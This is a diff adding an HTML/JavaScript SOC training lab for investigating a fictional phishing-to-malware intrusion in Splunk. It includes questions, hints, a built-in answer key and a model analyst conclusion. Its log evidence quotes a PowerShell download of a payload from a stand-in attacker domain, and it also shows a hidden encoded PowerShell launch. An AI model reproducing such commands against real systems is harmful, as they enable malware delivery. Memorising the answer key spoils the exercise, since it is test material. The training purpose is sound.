@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SOC L1 Lab Console | INC-2026-1121</title>
+  <style>
+    :root {
+      --bg-app: #080c14;
+      --bg-panel: #101725;
+      --bg-card: #172133;
+      --bg-code: #06080e;
+      --border: #25334b;
+      --text-main: #e6eef8;
+      --text-dim: #94a3b8;
+      --text-muted: #64748b;
+      --accent-blue: #38bdf8;
+      --accent-cyan: #2dd4bf;
+      --accent-green: #22c55e;
+      --accent-amber: #f59e0b;
+      --accent-red: #ef4444;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+      background: var(--bg-app);
+      color: var(--text-main);
+      line-height: 1.55;
+      padding-bottom: 64px;
+    }
+
+    header {
+      background: linear-gradient(180deg, #111a2c 0%, #0a101c 100%);
+      border-bottom: 1px solid var(--border);
+      padding: 16px 28px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: 0 4px 22px rgba(0, 0, 0, 0.5);
+    }
+
+    .header-wrap {
+      max-width: 1240px;
+      margin: 0 auto;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .brand { display: flex; align-items: center; gap: 12px; }
+
+    .badge-soc {
+      background: rgba(56, 189, 248, 0.15);
+      border: 1px solid var(--accent-blue);
+      color: var(--accent-blue);
+      font-size: 0.74rem;
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      padding: 4px 10px;
+      border-radius: 4px;
+    }
+
+    .brand h1 { font-size: 1.18rem; font-weight: 700; color: #f8fafc; }
+
+    .pills { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; }
+
+    .pill {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 5px 12px;
+      font-size: 0.82rem;
+      color: var(--text-dim);
+    }
+
+    .pill strong { color: var(--text-main); }
+    .pill.score { border-color: var(--accent-cyan); color: var(--accent-cyan); }
+
+    main {
+      max-width: 1240px;
+      margin: 24px auto;
+      padding: 0 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    .panel {
+      background: var(--bg-panel);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 22px;
+    }
+
+    .panel-head {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 10px;
+      border-bottom: 1px solid var(--border);
+      padding-bottom: 10px;
+      margin-bottom: 16px;
+    }
+
+    .panel-title {
+      font-size: 0.98rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--accent-blue);
+    }
+
+    .ticket-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 12px;
+      margin-bottom: 14px;
+    }
+
+    .t-box {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 10px 14px;
+    }
+
+    .t-label {
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      color: var(--text-muted);
+      margin-bottom: 2px;
+    }
+
+    .t-val {
+      font-family: "Consolas", "Courier New", monospace;
+      font-size: 0.88rem;
+      font-weight: 600;
+      color: var(--text-main);
+    }
+
+    .sev-crit { color: var(--accent-red); }
+
+    .t-desc {
+      background: var(--bg-code);
+      border-left: 3px solid var(--accent-red);
+      padding: 12px 16px;
+      border-radius: 0 6px 6px 0;
+      font-size: 0.9rem;
+    }
+
+    .grid-2 {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(430px, 1fr));
+      gap: 20px;
+    }
+
+    ul.guide { margin-left: 18px; color: var(--text-dim); font-size: 0.9rem; }
+    ul.guide li { margin-bottom: 7px; }
+    ul.guide li strong { color: var(--text-main); }
+
+    code {
+      font-family: "Consolas", "Courier New", monospace;
+      color: #7dd3fc;
+      font-size: 0.88em;
+    }
+
+    .spl-bar {
+      background: var(--bg-code);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 9px 12px;
+      margin: 6px 0 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 10px;
+      overflow-x: auto;
+    }
+
+    .spl-bar code { color: #67e8f9; font-size: 0.83rem; white-space: nowrap; }
+
+    .btn-copy {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      color: var(--text-dim);
+      padding: 4px 10px;
+      border-radius: 4px;
+      font-size: 0.75rem;
+      cursor: pointer;
+    }
+
+    .btn-copy:hover { border-color: var(--accent-blue); color: var(--text-main); }
+
+    .q-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 16px 18px;
+      margin-bottom: 14px;
+    }
+
+    .q-card.q-ok { border-color: var(--accent-green); }
+    .q-card.q-bad { border-color: var(--accent-red); }
+
+    .q-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 10px;
+    }
+
+    .q-prompt { font-size: 0.96rem; font-weight: 600; color: #f8fafc; }
+
+    .q-pts {
+      background: rgba(56, 189, 248, 0.14);
+      border: 1px solid rgba(56, 189, 248, 0.35);
+      color: var(--accent-blue);
+      font-size: 0.76rem;
+      font-weight: 700;
+      padding: 2px 10px;
+      border-radius: 12px;
+      white-space: nowrap;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      background: var(--bg-code);
+      border: 1px solid var(--border);
+      color: var(--text-main);
+      padding: 9px 12px;
+      border-radius: 6px;
+      font-family: "Consolas", "Courier New", monospace;
+      font-size: 0.9rem;
+    }
+
+    input[type="text"]:focus { outline: none; border-color: var(--accent-blue); }
+
+    .hint-row { margin-top: 8px; }
+
+    .btn-hint {
+      background: transparent;
+      border: 1px solid var(--border);
+      color: var(--accent-amber);
+      padding: 4px 11px;
+      border-radius: 5px;
+      font-size: 0.78rem;
+      cursor: pointer;
+    }
+
+    .btn-hint:hover:not(:disabled) { background: rgba(245, 158, 11, 0.1); }
+    .btn-hint:disabled { opacity: 0.45; cursor: not-allowed; }
+
+    .hints-box { margin-top: 8px; display: flex; flex-direction: column; gap: 5px; }
+
+    .hint-msg {
+      background: rgba(245, 158, 11, 0.08);
+      border-left: 3px solid var(--accent-amber);
+      padding: 7px 11px;
+      border-radius: 0 4px 4px 0;
+      font-size: 0.84rem;
+      color: #fde68a;
+    }
+
+    .q-fb {
+      display: none;
+      margin-top: 12px;
+      padding-top: 10px;
+      border-top: 1px dashed var(--border);
+      font-size: 0.86rem;
+    }
+
+    .tag-ok, .tag-bad {
+      display: inline-block;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 0.75rem;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+
+    .tag-ok { background: rgba(34, 197, 94, 0.15); color: var(--accent-green); border: 1px solid var(--accent-green); }
+    .tag-bad { background: rgba(239, 68, 68, 0.15); color: var(--accent-red); border: 1px solid var(--accent-red); }
+
+    .fb-line { margin-bottom: 4px; color: var(--text-dim); }
+    .fb-line strong { color: var(--text-main); }
+
+    .actions { display: flex; gap: 12px; flex-wrap: wrap; margin-top: 8px; }
+
+    .btn-primary {
+      background: var(--accent-blue);
+      color: #07101d;
+      border: none;
+      padding: 11px 22px;
+      font-size: 0.92rem;
+      font-weight: 700;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .btn-secondary {
+      background: var(--bg-card);
+      color: var(--text-main);
+      border: 1px solid var(--border);
+      padding: 11px 18px;
+      font-size: 0.92rem;
+      font-weight: 600;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    #results-panel, #conclusion-panel { display: none; }
+
+    .score-box {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 14px;
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 16px 20px;
+      margin-bottom: 12px;
+    }
+
+    .score-val { font-size: 1.9rem; font-weight: 800; color: var(--accent-cyan); }
+
+    .verdict {
+      padding: 6px 14px;
+      border-radius: 6px;
+      font-weight: 700;
+      font-size: 0.9rem;
+    }
+
+    .verdict.pass { background: rgba(34, 197, 94, 0.15); color: var(--accent-green); border: 1px solid var(--accent-green); }
+    .verdict.fail { background: rgba(239, 68, 68, 0.15); color: var(--accent-red); border: 1px solid var(--accent-red); }
+
+    .conc-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+
+    .conc-item {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 12px 14px;
+    }
+
+    .conc-item h4 {
+      color: var(--accent-cyan);
+      font-size: 0.78rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      margin-bottom: 5px;
+    }
+
+    .conc-item p, .conc-item ul { font-size: 0.88rem; color: var(--text-main); }
+    .conc-item ul { margin-left: 16px; }
+
+    @media (max-width: 560px) {
+      .grid-2 { grid-template-columns: 1fr; }
+      header { padding: 12px 16px; }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="header-wrap">
+    <div class="brand">
+      <span class="badge-soc">SOC L1 Hard Lab</span>
+      <h1>Phishing Email Leading to Malicious Execution</h1>
+    </div>
+    <div class="pills">
+      <div class="pill">Incident: <strong>INC-2026-1121</strong></div>
+      <div class="pill">Difficulty: <strong>Hard</strong></div>
+      <div class="pill">Est. Time: <strong>45–60 mins</strong></div>
+      <div class="pill score">Score: <strong id="hdr-score">0 / 100</strong></div>
+    </div>
+  </div>
+</header>
+
+<main>
+  <section class="panel">
+    <div class="panel-head"><div class="panel-title">01 // Mission Brief</div></div>
+    <p style="color: var(--text-dim); font-size: 0.92rem;">
+      You are investigating a multi-stage email-to-endpoint intrusion for <strong style="color: var(--text-main);">Chesapeake Cold Storage &amp; Freight</strong>. Ingest the JSONL dataset into <code>index=soc</code>, correlate email gateway, proxy, DNS, Sysmon, PowerShell, and Windows Security logs across multiple users and hosts, separate benign phishing/script noise from actual compromise, and answer all 9 questions.
+    </p>
+  </section>
+
+  <section class="panel">
+    <div class="panel-head">
+      <div class="panel-title">02 // SOC Alert Ticket</div>
+      <span class="pill" style="border-color: var(--accent-red); color: var(--accent-red);">Severity: Critical</span>
+    </div>
+    <div class="ticket-grid">
+      <div class="t-box"><div class="t-label">Incident ID</div><div class="t-val">INC-2026-1121</div></div>
+      <div class="t-box"><div class="t-label">Alert Name</div><div class="t-val">Phishing Attachment &rarr; Suspicious Execution</div></div>
+      <div class="t-box"><div class="t-label">Severity</div><div class="t-val sev-crit">CRITICAL</div></div>
+      <div class="t-box"><div class="t-label">Detection Source</div><div class="t-val">Email Gateway + EDR Telemetry</div></div>
+      <div class="t-box"><div class="t-label">Alert Timestamp (UTC)</div><div class="t-val">2026-11-20T19:16:22Z</div></div>
+      <div class="t-box"><div class="t-label">Initial Target</div><div class="t-val">WS-AP-011 / CHESAPEAKE\c.brennan</div></div>
+      <div class="t-box"><div class="t-label">Initial Indicators</div><div class="t-val">Suspicious attachment &rarr; LOLBin/script chain</div></div>
+      <div class="t-box"><div class="t-label">Investigation Window</div><div class="t-val">2026-11-20 19:00:00Z – 20:00:00Z</div></div>
+    </div>
+    <div class="t-desc">
+      <strong>Initial Alert Description:</strong> A delivered email attachment was opened on <code>WS-AP-011</code> (<code>10.50.14.37</code>) by <code>CHESAPEAKE\c.brennan</code>, triggering downstream execution and network activity. Determine the full intrusion chain, external infrastructure, persistence, scope across accounts/hosts, and outcome of any follow-on access attempts while accounting for red herrings.
+    </div>
+  </section>
+
+  <div class="grid-2">
+    <section class="panel">
+      <div class="panel-head"><div class="panel-title">03 // Splunk Setup</div></div>
+      <ul class="guide">
+        <li><strong>Index:</strong> Load the JSONL dataset into <code>index=soc</code> using sourcetype <code>_json</code>.</li>
+        <li><strong>Time Window:</strong> Set time filter to <code>2026-11-20 19:00:00</code> – <code>20:00:00 UTC</code> (or <em>All Time</em>).</li>
+        <li><strong>Sources:</strong> <code>email</code>, <code>proxy</code>, <code>dns</code>, <code>sysmon</code>, <code>powershell</code>, <code>wineventlog:security</code>, <code>firewall</code>.</li>
+      </ul>
+    </section>
+
+    <section class="panel">
+      <div class="panel-head"><div class="panel-title">04 // Starter SPL Queries</div></div>
+      <p style="font-size: 0.84rem; color: var(--text-dim);">Inspect email deliveries and attachments:</p>
+      <div class="spl-bar">
+        <code>index=soc source="email" | table _time sender recipient subject attachment url</code>
+        <button class="btn-copy" onclick="copySPL(this)">Copy</button>
+      </div>
+      <p style="font-size: 0.84rem; color: var(--text-dim);">Correlate endpoint processes and network activity on WS-AP-011:</p>
+      <div class="spl-bar">
+        <code>index=soc host="WS-AP-011" | sort _time | table _time source event_type process_name parent_process_name command_line dest_ip dest_port</code>
+        <button class="btn-copy" onclick="copySPL(this)">Copy</button>
+      </div>
+    </section>
+  </div>
+
+  <section class="panel">
+    <div class="panel-head">
+      <div class="panel-title">05 // Investigation Questions (100 Points)</div>
+      <span style="font-size: 0.84rem; color: var(--text-dim);">Pass threshold: 75 / 100</span>
+    </div>
+    <div id="q-root"></div>
+    <div class="actions">
+      <button class="btn-primary" onclick="gradeLab()">Submit Investigation</button>
+      <button class="btn-secondary" onclick="resetLab()">Reset Lab</button>
+    </div>
+  </section>
+
+  <section class="panel" id="results-panel">
+    <div class="panel-head"><div class="panel-title">06 // Assessment Results</div></div>
+    <div class="score-box">
+      <div>
+        <div style="font-size: 0.76rem; color: var(--text-dim); text-transform: uppercase;">Score</div>
+        <div class="score-val" id="res-score">0 / 100</div>
+      </div>
+      <div id="res-verdict" class="verdict">PENDING</div>
+      <p id="res-msg" style="max-width: 540px; font-size: 0.88rem; color: var(--text-dim);"></p>
+    </div>
+  </section>
+
+  <section class="panel" id="conclusion-panel">
+    <div class="panel-head">
+      <div class="panel-title">07 // Model SOC Analyst Conclusion</div>
+      <span class="tag-bad" style="margin:0;">TRUE POSITIVE — MALICIOUS</span>
+    </div>
+    <div class="conc-grid">
+      <div class="conc-item">
+        <h4>Classification</h4>
+        <p><strong>True Positive (Malicious)</strong> — Spearphishing ISO attachment leading to LNK/PowerShell execution, remote payload drop, Run-key persistence, C2 beaconing, and an unsuccessful SMB attempt against a file server.</p>
+      </div>
+      <div class="conc-item">
+        <h4>MITRE ATT&amp;CK</h4>
+        <ul>
+          <li><strong>Initial Access:</strong> T1566.001 (Spearphishing Attachment)</li>
+          <li><strong>Execution:</strong> T1059.001 (PowerShell)</li>
+          <li><strong>Persistence:</strong> T1547.001 (Registry Run Keys)</li>
+        </ul>
+      </div>
+      <div class="conc-item">
+        <h4>Scope &amp; Red Herrings</h4>
+        <ul>
+          <li><strong>Compromised Host/User:</strong> WS-AP-011 (10.50.14.37) / CHESAPEAKE\c.brennan</li>
+          <li><strong>C2 Infrastructure:</strong> coldchain-billing-sync.com / 192.0.2.77</li>
+          <li><strong>Benign Noise:</strong> p.linn email (no execution); svc_inventory PowerShell</li>
+        </ul>
+      </div>
+    </div>
+    <div class="conc-item" style="margin-bottom: 12px;">
+      <h4>Incident Summary</h4>
+      <p>
+        At <strong>19:12:05Z</strong>, <code>ar-updates@freight-carrier-portal.com</code> delivered phishing emails with <code>Carrier_Statement_Nov2026.iso</code> to <code>c.brennan</code> and <code>p.linn</code>. Only <code>c.brennan</code> mounted and executed the payload chain on <code>WS-AP-011</code>: <code>explorer.exe</code> launched <code>wscript.exe</code> running <code>Invoice_Verify.vbs</code> at <strong>19:15:40Z</strong>, which spawned <code>powershell.exe -NoP -W Hidden -enc ...</code> (PID <code>7204</code>) at <strong>19:16:22Z</strong>. Script block logging (Event ID 4104) showed PowerShell downloading <code>coldroute_svc.exe</code> from <code>http://coldchain-billing-sync.com/srv/coldroute_svc.exe</code> (<code>192.0.2.77</code>) into <code>C:\Users\c.brennan\AppData\Local\Temp\coldroute_svc.exe</code> and launching it (PID <code>7410</code>). Persistence was added via <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ColdRouteAgent</code> at <strong>19:17:02Z</strong>, followed by TCP/443 C2 beacons to <code>192.0.2.77</code> and a failed SMB logon (Event ID 4625, <code>0xC0000022</code>) to <code>FS-COLD-01</code> (<code>10.50.10.12</code>) at <strong>19:21:18Z</strong>.
+      </p>
+    </div>
+    <div class="conc-item">
+      <h4>Recommended Response</h4>
+      <ul>
+        <li>Isolate <code>WS-AP-011</code> via EDR, reset <code>CHESAPEAKE\c.brennan</code> credentials/MFA, and purge the phishing message from mailboxes.</li>
+        <li>Block <code>coldchain-billing-sync.com</code> and <code>192.0.2.77</code>; delete Run key <code>ColdRouteAgent</code> and quarantine <code>coldroute_svc.exe</code>.</li>
+        <li>Escalate to Tier 2 IR to validate <code>FS-COLD-01</code> and check for any other hosts mounting <code>Carrier_Statement_Nov2026.iso</code>.</li>
+      </ul>
+    </div>
+  </section>
+</main>
+
+<script>
+  const Q_LIST = [
+    {
+      id: "q1",
+      pts: 10,
+      prompt: "1. What is the sender email address of the phishing email that delivered the malicious attachment?",
+      placeholder: "e.g., alerts@example.com",
+      hints: [
+        "Search source=\"email\" events around 19:12Z.",
+        "Check the sender field on the email carrying the .iso attachment.",
+        "The sender address belongs to freight-carrier-portal.com."
+      ],
+      accepted: ["ar-updates@freight-carrier-portal.com"],
+      display: "ar-updates@freight-carrier-portal.com",
+      explanation: "Email gateway logs at 19:12:05Z show ar-updates@freight-carrier-portal.com sending Carrier_Statement_Nov2026.iso.",
+      evidence: "2026-11-20T19:12:05Z | source=email | sender=ar-updates@freight-carrier-portal.com | attachment=Carrier_Statement_Nov2026.iso",
+      spl: "index=soc source=\"email\" | table _time sender recipient attachment"
+    },
+    {
+      id: "q2",
+      pts: 10,
+      prompt: "2. What is the exact filename of the phishing attachment delivered to c.brennan?",
+      placeholder: "e.g., report.iso",
+      hints: [
+        "Filter source=\"email\" for recipient=\"*c.brennan*\".",
+        "Inspect the attachment field.",
+        "It is an ISO disk image referencing a November 2026 carrier statement."
+      ],
+      accepted: ["carrier_statement_nov2026.iso"],
+      display: "Carrier_Statement_Nov2026.iso",
+      explanation: "The phishing email delivered Carrier_Statement_Nov2026.iso at 19:12:05Z.",
+      evidence: "2026-11-20T19:12:05Z | source=email | recipient=c.brennan@chesapeakefreight.local | attachment=Carrier_Statement_Nov2026.iso",
+      spl: "index=soc source=\"email\" recipient=\"*c.brennan*\" | table _time sender subject attachment"
+    },
+    {
+      id: "q3",
+      pts: 10,
+      prompt: "3. Which process directly spawned the suspicious powershell.exe (PID 7204) on WS-AP-011?",
+      placeholder: "e.g., cmd.exe",
+      hints: [
+        "Check Sysmon ProcessCreate (event_id=1) on WS-AP-011 for process_id=7204.",
+        "Look at parent_process_name at 19:16:22Z.",
+        "A VBScript host process (wscript.exe) launched PowerShell."
+      ],
+      accepted: ["wscript.exe", "c:\\windows\\system32\\wscript.exe"],
+      display: "wscript.exe",
+      explanation: "At 19:16:22Z, wscript.exe (PID 6980, running Invoice_Verify.vbs) spawned powershell.exe (PID 7204).",
+      evidence: "2026-11-20T19:16:22Z | source=sysmon | event_id=1 | host=WS-AP-011 | parent_process_name=wscript.exe | process_id=7204",
+      spl: "index=soc source=\"sysmon\" host=\"WS-AP-011\" process_id=7204 | table _time parent_process_name process_name command_line"
+    },
+    {
+      id: "q4",
+      pts: 15,
+      prompt: "4. What external domain did the PowerShell script block query/contact to retrieve the secondary payload?",
+      placeholder: "e.g., sync-domain.com",
+      hints: [
+        "Examine source=\"powershell\" (event_id=4104) or source=\"dns\" on WS-AP-011 around 19:16:24Z.",
+        "Look at script_block_text for process_id=7204.",
+        "The domain contains coldchain-billing-sync."
+      ],
+      accepted: ["coldchain-billing-sync.com", "http://coldchain-billing-sync.com", "http://coldchain-billing-sync.com/srv/coldroute_svc.exe"],
+      display: "coldchain-billing-sync.com",
+      explanation: "PowerShell Event ID 4104 at 19:16:24Z shows Invoke-WebRequest fetching http://coldchain-billing-sync.com/srv/coldroute_svc.exe.",
+      evidence: "2026-11-20T19:16:24Z | source=powershell | event_id=4104 | script_block_text=\"Invoke-WebRequest -Uri 'http://coldchain-billing-sync.com/srv/coldroute_svc.exe' ...\"",
+      spl: "index=soc host=\"WS-AP-011\" (source=\"powershell\" OR source=\"dns\") | table _time source query script_block_text"
+    },
+    {
+      id: "q5",
+      pts: 15,
+      prompt: "5. What is the full path (or filename) of the dropped payload executed by powershell.exe?",
+      placeholder: "e.g., C:\\Temp\\svc.exe",
+      hints: [
+        "Check Sysmon FileCreate (event_id=11) or ProcessCreate (event_id=1) with parent_process_id=7204.",
+        "Look at the image_path of child PID 7410 at 19:16:28Z.",
+        "The executable is named coldroute_svc.exe inside c.brennan's AppData\\Local\\Temp folder."
+      ],
+      accepted: [
+        "c:\\users\\c.brennan\\appdata\\local\\temp\\coldroute_svc.exe",
+        "coldroute_svc.exe"
+      ],
+      display: "C:\\Users\\c.brennan\\AppData\\Local\\Temp\\coldroute_svc.exe (coldroute_svc.exe)",
+      explanation: "PowerShell wrote coldroute_svc.exe to C:\\Users\\c.brennan\\AppData\\Local\\Temp\\coldroute_svc.exe and executed it as PID 7410.",
+      evidence: "2026-11-20T19:16:28Z | source=sysmon | event_id=1 | parent_process_id=7204 | process_id=7410 | process_name=coldroute_svc.exe",
+      spl: "index=soc source=\"sysmon\" host=\"WS-AP-011\" parent_process_id=7204 | table _time event_id process_name image_path target_filename"
+    },
+    {
+      id: "q6",
+      pts: 10,
+      prompt: "6. What external C2 IP address did coldroute_svc.exe beacon to over TCP port 443?",
+      placeholder: "e.g., 192.0.2.10",
+      hints: [
+        "Check Sysmon NetworkConnect (event_id=3) or firewall logs for WS-AP-011 (10.50.14.37) on dest_port=443.",
+        "Look for repeated outbound connections by coldroute_svc.exe starting at 19:17:30Z.",
+        "The IP is in the 192.0.2.0/24 documentation/test range."
+      ],
+      accepted: ["192.0.2.77"],
+      display: "192.0.2.77",
+      explanation: "coldroute_svc.exe (PID 7410) established recurring outbound TCP/443 connections to 192.0.2.77.",
+      evidence: "2026-11-20T19:17:30Z | source=sysmon | event_id=3 | process_name=coldroute_svc.exe | dest_ip=192.0.2.77 | dest_port=443",
+      spl: "index=soc host=\"WS-AP-011\" dest_port=443 | stats count by process_name dest_ip source"
+    },
+    {
+      id: "q7",
+      pts: 10,
+      prompt: "7. What Run-key value name did coldroute_svc.exe set under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run?",
+      placeholder: "e.g., SyncHelper",
+      hints: [
+        "Search Sysmon RegistryValueSet (event_id=13) on WS-AP-011 around 19:17:02Z.",
+        "Inspect target_object for CurrentVersion\\Run.",
+        "The value name is ColdRouteAgent."
+      ],
+      accepted: ["coldrouteagent"],
+      display: "ColdRouteAgent",
+      explanation: "At 19:17:02Z, coldroute_svc.exe created persistence entry HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ColdRouteAgent.",
+      evidence: "2026-11-20T19:17:02Z | source=sysmon | event_id=13 | target_object=HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ColdRouteAgent",
+      spl: "index=soc source=\"sysmon\" host=\"WS-AP-011\" event_id=13 | table _time process_name target_object details"
+    },
+    {
+      id: "q8",
+      pts: 10,
+      prompt: "8. Correlate network and security logs: which internal server was targeted over SMB (port 445) from WS-AP-011, and did the logon succeed or fail? (Format: HOSTNAME - Failed/Succeeded)",
+      placeholder: "e.g., FS-01 - Failed",
+      hints: [
+        "Filter Sysmon Event ID 3 on WS-AP-011 for dest_port=445 around 19:21:18Z.",
+        "Check wineventlog:security on the destination host for event_id=4625 from 10.50.14.37.",
+        "Target is FS-COLD-01 (10.50.10.12), and status 0xC0000022 indicates Access Denied."
+      ],
+      accepted: ["fs-cold-01 - failed", "fs-cold-01 failed", "fs-cold-01 (10.50.10.12) - failed", "10.50.10.12 - failed"],
+      display: "FS-COLD-01 (10.50.10.12) - Failed",
+      explanation: "At 19:21:18Z, coldroute_svc.exe attempted an SMB connection to FS-COLD-01 (10.50.10.12:445), which failed on FS-COLD-01 with Security Event ID 4625 (0xC0000022).",
+      evidence: "2026-11-20T19:21:19Z | source=wineventlog:security | host=FS-COLD-01 | event_id=4625 | user=CHESAPEAKE\\c.brennan | status=0xC0000022",
+      spl: "index=soc (dest_port=445 OR event_id=4625) src_ip=\"10.50.14.37\" | table _time host source event_id user dest_ip status"
+    },
+    {
+      id: "q9",
+      pts: 10,
+      prompt: "9. Second recipient p.linn also received the phishing email at 19:12:05Z. Based on endpoint/proxy/DNS logs, was p.linn's host (WS-AR-019) compromised or unaffected?",
+      placeholder: "e.g., Unaffected",
+      hints: [
+        "Search logs for host=\"WS-AR-019\" or user=\"*p.linn*\".",
+        "Check whether Carrier_Statement_Nov2026.iso was written, executed, or followed by DNS/proxy lookups to coldchain-billing-sync.com on WS-AR-019.",
+        "No malicious file execution or C2 traffic occurred on WS-AR-019."
+      ],
+      accepted: ["unaffected", "not compromised", "benign", "no compromise", "unaffected (no execution)"],
+      display: "Unaffected (No execution or C2 activity observed on WS-AR-019)",
+      explanation: "Although p.linn received the email at 19:12:05Z, WS-AR-019 shows normal browsing/Office activity only—no file drop, wscript/PowerShell chain, or C2 connection.",
+      evidence: "2026-11-20T19:14:10Z | host=WS-AR-019 | source=dns | query=portal.chesapeakefreight.local | rcode=NOERROR",
+      spl: "index=soc (host=\"WS-AR-019\" OR user=\"*p.linn*\") | table _time host source event_type query url command_line"
+    }
+  ];
+
+  const hState = {};
+
+  function renderQ() {
+    const root = document.getElementById("q-root");
+    root.innerHTML = "";
+    Q_LIST.forEach((q) => {
+      hState[q.id] = 0;
+      const div = document.createElement("div");
+      div.className = "q-card";
+      div.id = "qcard-" + q.id;
+      div.innerHTML = `
+        <div class="q-top">
+          <div class="q-prompt">${q.prompt}</div>
+          <div class="q-pts">${q.pts} pts</div>
+        </div>
+        <input type="text" id="ans-${q.id}" placeholder="${q.placeholder}" autocomplete="off" />
+        <div class="hint-row">
+          <button type="button" class="btn-hint" id="hbtn-${q.id}" onclick="addHint('${q.id}')">Reveal Hint (0/${q.hints.length})</button>
+        </div>
+        <div class="hints-box" id="hbox-${q.id}"></div>
+        <div class="q-fb" id="fb-${q.id}"></div>
+      `;
+      root.appendChild(div);
+    });
+  }
+
+  function addHint(qid) {
+    const q = Q_LIST.find((x) => x.id === qid);
+    if (!q) return;
+    const idx = hState[qid] || 0;
+    if (idx >= q.hints.length) return;
+    const box = document.getElementById("hbox-" + qid);
+    const item = document.createElement("div");
+    item.className = "hint-msg";
+    item.innerHTML = `<strong>Hint ${idx + 1}:</strong> ${q.hints[idx]}`;
+    box.appendChild(item);
+    hState[qid] = idx + 1;
+    const btn = document.getElementById("hbtn-" + qid);
+    btn.textContent = `Reveal Hint (${hState[qid]}/${q.hints.length})`;
+    if (hState[qid] >= q.hints.length) btn.disabled = true;
+  }
+
+  function norm(s) {
+    return s.toLowerCase().trim().replace(/^["'`]+|["'`]+$/g, "").replace(/\s+/g, " ").replace(/[.,;:!?()[\]{}]+$/g, "");
+  }
+
+  function matchAns(raw, arr) {
+    const u = norm(raw);
+    if (!u) return false;
+    return arr.some((a) => norm(a) === u);
+  }
+
+  function gradeLab() {
+    let score = 0;
+    let okCount = 0;
+    Q_LIST.forEach((q) => {
+      const val = document.getElementById("ans-" + q.id).value;
+      const card = document.getElementById("qcard-" + q.id);
+      const fb = document.getElementById("fb-" + q.id);
+      const ok = matchAns(val, q.accepted);
+      card.classList.remove("q-ok", "q-bad");
+      if (ok) {
+        score += q.pts;
+        okCount += 1;
+        card.classList.add("q-ok");
+      } else {
+        card.classList.add("q-bad");
+      }
+      fb.style.display = "block";
+      fb.innerHTML = `
+        <div>${ok ? `<span class="tag-ok">CORRECT (+${q.pts} PTS)</span>` : `<span class="tag-bad">INCORRECT (0 / ${q.pts} PTS)</span>`}</div>
+        <div class="fb-line"><strong>Your Answer:</strong> ${val ? esc(val) : "<em>Blank</em>"}</div>
+        <div class="fb-line"><strong>Expected Answer:</strong> ${esc(q.display)}</div>
+        <div class="fb-line"><strong>Explanation:</strong> ${esc(q.explanation)}</div>
+        <div class="fb-line"><strong>Evidence:</strong> <code>${esc(q.evidence)}</code></div>
+        <div class="fb-line"><strong>Recommended SPL:</strong> <code>${esc(q.spl)}</code></div>
+      `;
+    });
+
+    document.getElementById("hdr-score").textContent = `${score} / 100`;
+    document.getElementById("res-score").textContent = `${score} / 100`;
+    const pass = score >= 75;
+    const v = document.getElementById("res-verdict");
+    v.textContent = pass ? "PASS — READY FOR TIER 2 ESCALATION" : "NEEDS REVIEW (< 75 PTS)";
+    v.className = `verdict ${pass ? "pass" : "fail"}`;
+    document.getElementById("res-msg").textContent = pass
+      ? `Scored ${score}/100 (${okCount}/${Q_LIST.length} correct). Review the analyst conclusion below before escalating.`
+      : `Scored ${score}/100 (${okCount}/${Q_LIST.length} correct). Check the recommended SPL queries and retry.`;
+
+    document.getElementById("results-panel").style.display = "block";
+    document.getElementById("conclusion-panel").style.display = "block";
+    document.getElementById("results-panel").scrollIntoView({ behavior: "smooth" });
+  }
+
+  function resetLab() {
+    document.getElementById("hdr-score").textContent = "0 / 100";
+    document.getElementById("results-panel").style.display = "none";
+    document.getElementById("conclusion-panel").style.display = "none";
+    renderQ();
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  }
+
+  function copySPL(btn) {
+    navigator.clipboard.writeText(btn.previousElementSibling.textContent).then(() => {
+      const t = btn.textContent;
+      btn.textContent = "Copied";
+      setTimeout(() => { btn.textContent = t; }, 1200);
+    });
